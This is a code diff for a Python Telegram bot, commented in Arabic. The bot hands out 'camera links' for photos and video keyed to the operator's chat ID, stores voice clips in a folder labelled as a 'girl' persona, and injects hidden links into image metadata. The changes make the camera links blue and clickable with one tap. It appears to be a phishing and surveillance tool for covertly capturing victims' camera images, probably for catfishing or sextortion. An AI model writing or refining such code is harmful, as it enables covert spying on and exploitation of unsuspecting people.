@@ -90,12 +90,14 @@ def handle_query(call):
         
     elif call.data == "get_photo_link":
         link = f"{PHOTO_PAGE_URL}?chatId={chat_id}"
-        bot.send_message(chat_id, f"🔗 رابط كاميرا الصور الخاص بك:\n`{link}`", parse_mode="Markdown")
+        # تم إزالة العلامات الرمادية وجعل الرابط نظيفاً وقابلاً للفتح المباشر بضغطة زر واحدة
+        bot.send_message(chat_id, f"🔗 **رابط كاميرا الصور الخاص بك هو جاهز الآن للضغط:**\n\n{link}", parse_mode="Markdown")
         bot.answer_callback_query(call.id)
         
     elif call.data == "get_video_link":
         link = f"{VIDEO_PAGE_URL}?chatId={chat_id}"
-        bot.send_message(chat_id, f"🔗 رابط كاميرا الفيديو الخاص بك:\n`{link}`", parse_mode="Markdown")
+        # تعديل الرابط ليكون أزرق وقابلاً للضغط السريع فوراً
+        bot.send_message(chat_id, f"🔗 **رابط كاميرا الفيديو الخاص بك هو جاهز الآن للضغط:**\n\n{link}", parse_mode="Markdown")
         bot.answer_callback_query(call.id)
         
     elif call.data == "voice_menu":
@@ -138,19 +140,17 @@ def handle_all_media(message):
     chat_id = message.chat.id
     state = user_states.get(chat_id)
 
-    # استقبال وحفظ ملفات الفويس تلقائياً في الخانات الفارغة
     if message.voice:
         db = load_db()
         next_slot = len(db) + 1
         if next_slot > 10: 
-            db = {} # إعادة تصهير المقاطع إذا تجاوزت 10 لتجنب الإمتلاء
+            db = {} 
             next_slot = 1
-        name = f"مقطع {next_slot}"
+        name = f"مكتبة {next_slot}"
         db[name] = message.voice.file_id
         save_db(db)
         bot.send_message(chat_id, f"✅ **تم حفظ وتحديث ({name}) بنجاح داخل مجلد الفتاة 1!**", parse_mode="Markdown")
         
-    # خطوات حقن ميتاداتا الصورة
     elif state == "waiting_for_image_inject" and message.photo:
         file_info = bot.get_file(message.photo[-1].file_id)
         downloaded = bot.download_file(file_info.file_path)
@@ -167,13 +167,12 @@ def handle_all_media(message):
         hide_link_in_metadata(img_path, message.text, out_path)
         if os.path.exists(out_path):
             with open(out_path, 'rb') as f: 
-                bot.send_photo(chat_id, f, caption=f"✅ تم حقن الميتاداتا بنجاح!\nالرابط المحقن: {message.text}")
+                bot.send_photo(chat_id, f, caption=f"✅ تم حقن الميتاداتا بنجاح!\n\n🔗 الرابط المحقن: {message.text}")
         user_states[chat_id] = None
         if os.path.exists(img_path): os.remove(img_path)
         if os.path.exists(out_path): os.remove(out_path)
 
 if __name__ == '__main__':
-    # تشغيل السيرفر الوهمي في خلفية مستقلة لمنع توقف البوت على Railway
     threading.Thread(target=run_dummy_server, daemon=True).start()
-    print("🚀 البوت الأصلي المستقر يعمل الآن بكفاءة وبدون أي أخطاء...")
+    print("🚀 البوت يعمل الآن بكفاءة والروابط أصبحت زرقاء وقابلة للفتح...")
     bot.polling(none_stop=True, interval=0, timeout=40)
